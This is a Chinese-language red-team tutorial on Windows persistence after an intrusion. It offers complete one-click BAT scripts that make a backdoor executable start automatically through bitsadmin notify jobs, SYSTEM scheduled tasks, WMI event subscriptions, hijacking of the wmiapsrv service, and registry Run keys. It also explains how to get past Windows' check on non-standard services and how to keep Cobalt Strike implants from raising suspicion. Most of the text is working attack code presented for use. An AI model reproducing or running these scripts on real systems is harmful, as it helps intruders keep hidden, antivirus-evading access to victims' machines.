很多时候我们在对一个内网目标做渗透的时候，我们必须需要离开入口位置，找到内网中其它能出网的机器，快速占领根据地，网络边界区域的入口位置是最容易丢失权限的，当团队花了几天的时间打的一个点，因为入口机器权限的丢失而可能导致整个渗透项目的失败，所以权限维持特别是过一线杀软的权限维持是我们一线红队人员最基本的技能之一。

以下介绍几种比较取巧的开机启动方式

一【bitsadmin】

bitsadmin除了常用的用来在SQL注入或者shiro反序列化中下载执行外，前几年还有人发现这东西可以还可以用来做开机启动权限维持，经过先前的大量研究，核心代码如下：

bitsadmin /create ShiMizhudoor

bitsadmin /addfile ShiMizhudoor %comspec%  %temp%\cmd.exe

bitsadmin.exe /SetNotifyCmdLine ShiMizhudoor "%COMSPEC%" "cmd.exe /c start %ph%run.vbs"

bitsadmin /Resume ShiMizhudoor

上面代码一共4行，分别为创建任务ShiMizhudoor、任务下载路径（可以本地，所以才能做权限维持）、下载后执行，最后再恢复任务，目的就是让系统重启后运行指定路径下的run.vbs

完整的BAT代码如下（bat这个东西感觉现在慢慢已经失传了，其实这东西在渗透的过程中特别有用，往往最简单最基础的东西反而是最好的东西），以下代码保存为xx.bat，如果要对指定路径下的某一个exe做权限维持，xx.bat c:\users\public\music\s.exe


@echo off

:: 该脚本只能运行于win7 windows2008 2012等 2016未测试

set Cms=%*

if not defined Cms goto zx

if not exist %1 (echo.&&echo File not exist&&goto exit)

set pm=%1

set ph=%~dp1

echo set ws=wscript.createobject("wscript.shell") >%ph%run.vbs

echo ws.run "%pm%",0 >>%ph%run.vbs



bitsadmin /create ShiMizhudoor

bitsadmin /addfile ShiMizhudoor %comspec% %temp%\cmd.exe

bitsadmin.exe /SetNotifyCmdLine ShiMizhudoor "%COMSPEC%" "cmd.exe /c start %ph%run.vbs"

bitsadmin /Resume ShiMizhudoor

echo Install complete!!

goto exit


:zx

echo.

echo Please enter the path of the auto-start program

echo Example:

echo auto.bat c:\users\public\s.exe

echo.

:exit



二【schtasks】

schtasks这个做权限维持，很多兄弟应该知道的啦，没啥多说的，无非就是创建一个开机启动的计划任务

核心代码如下：

schtasks.exe /create /tn "restart" /ru SYSTEM /sc ONSTART /tr "%ph%run.vbs" /f

解释：/ru SYSTEM 以system权限执行，/tn 计划任务名称 /sc 执行模式，这里设置为ONSTART 当登录的时候启动，/tr 执行路径，/f 强制添加，即便是遇到相同名称的计划任务，直接覆盖。

我个人还是把这个技术做成了一键BAT，完成代码如下（运行方式 xx.bat c:\users\public\s.exe  这个s.exe就是我们需要开机启动的程序）：

@echo off

set Cms=%*

if not defined Cms goto zx

if not exist %1 (echo.&&echo File not exist&&goto exit)

set pm=%1

set ph=%~dp1

echo set ws=wscript.createobject("wscript.shell") >%ph%run.vbs

echo ws.run "%pm%",0 >>%ph%run.vbs

::通过schtasks命令来做开机启动

schtasks.exe /create /tn "restart" /ru SYSTEM /sc ONSTART /tr "%ph%run.vbs" /f

if %errorlevel%==0 (

echo.

echo Successful installation of the self-starting program!

) else (

echo.

echo Failed installation of the self-starting program!

)

goto exit

:zx

echo.

echo Please enter the path of the auto-start program

echo Example:

echo auto.bat c:\users\public\s.exe

echo.

:exit


三【wmi】

wmi的方式过做权限维持，这种方式是向系统注册一个定时器，定时器注册好后，可间隔指定的时间，运行一次指定路径的程序，无论系统重启与否，定时器再没有删除的情况下永远在指定的时间运行一次指定路径的代码，核心代码如下：

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=200  AND TargetInstance.SystemUpTime < 320"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="%psname%",CommandLineTemplate="%psname%"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""

当然以上代码，不能直接用于做权限维持，你需要解决，让代码只运行一次，而不是像个一定时间去执行，这样的花我们的Cobalt Strike上过段时间要上线N个被控端上来，管理是个傻子也明显发现有异常哈，所以我采用通过.net写了个exe，在这个exe中锁死执行一次，这里不贴完成代码了，懒得大家又去研究.net编程，这个不是此篇文章要讲的内容，后续直接上cna脚本


四【service】

通过创建一个服务来做权限维持，这个也是很多兄弟都知道的，核心代码如下：

:: 通过修改服务来开机启动

sc config %sname% start= disabled

sc config %sname% binpath= "%ph%exec.exe

sc config %sname% start= auto

通过修改一个现有的、不常用服务的启动路径为我们的指定后门程序的路径，来做到开机启动加载，上面三句代码分别为禁用某个服务，修改此服务为我们指定的程序路径，最后设置为开机启动，注意哈，重点来了哈，但是这里要提一个，你以为你把Cobalt Strike生成的马指定过去就可以正常运行了？windows对于非标准的服务程序有检测，如果启动后发现是非标准的服务程序，windows会在10秒内关闭此程序。这样你的程序还怎么去运行呢？我的办法是写了一个A程序来做服务开机启动程序，A程序去再次启动我们的B程序（木马程序），当系统把A程序干掉的时候，B程序成功绕过。

核心BAT代码如下：

@echo off

:: 一个通过修改服务来维持权限的小脚本

set Cms=%*

if not defined Cms goto zx

if not exist %1 (echo.&&echo File not exist&&goto exit)

set pm=%1

set ph=%~dp1

set ah=%~dp0

set sname=wmiapsrv

copy %ah%exec.exe %ph%exec.exe

::echo cmd /c start %pm% >%ph%run.bat

:: 通过修改服务来开机启动

sc stop %sname% 1>nul 2>nul

sc config %sname% start= disabled

sc config %sname% binpath= "%ph%exec.exe -e %pm%"

sc config %sname% start= auto


if %errorlevel%==0 (

echo.

echo Successful installation of the self-starting program!

) else (

echo.

echo Failed installation of the self-starting program!

)

goto exit

goto exit

:zx

echo.

echo Please enter the path of the auto-start program

echo Example:

echo auto.bat c:\users\public\s.exe

echo.

:exit


五【regedit】

注册表开机启动，这个不用多说了，烂大街了，核心代码就一句（不要以为就一句，很简单就不去看代码注释哦，有坑点的，同学）

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v run.vbs /t REG_SZ /d %ph%run.vbs

最后做成bat的完成代码如下：

@echo off

:: 一个通过注册表来实现开机启动的权限维持小脚本

:: 通过VBS启动主要是为了一些程序是命令行形式

:: 避免开机启动后弹出黑框

set Cms=%*

if not defined Cms goto zx

if not exist %1 (echo.&&echo File not exist&&goto exit)

set pm=%1

set ph=%~dp1

echo set ws=wscript.createobject("wscript.shell") >%ph%run.vbs

echo ws.run "%pm%",0 >>%ph%run.vbs

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v run.vbs /t REG_SZ /d %ph%run.vbs /f 1>nul 2>nul

if %errorlevel%==0 (

echo.

echo Successful installation of the self-starting program!

) else (

echo.

echo Failed installation of the self-starting program!

)

goto exit

goto exit

:zx

echo.

echo Please enter the path of the auto-start program

echo Example:

echo auto.bat c:\users\public\s.exe

echo.

:exit

以上代码的运行方式还是一日既往的 auto.bat c:\users\public\s.exe 其中s.exe为我们要需要开机启动的程序。
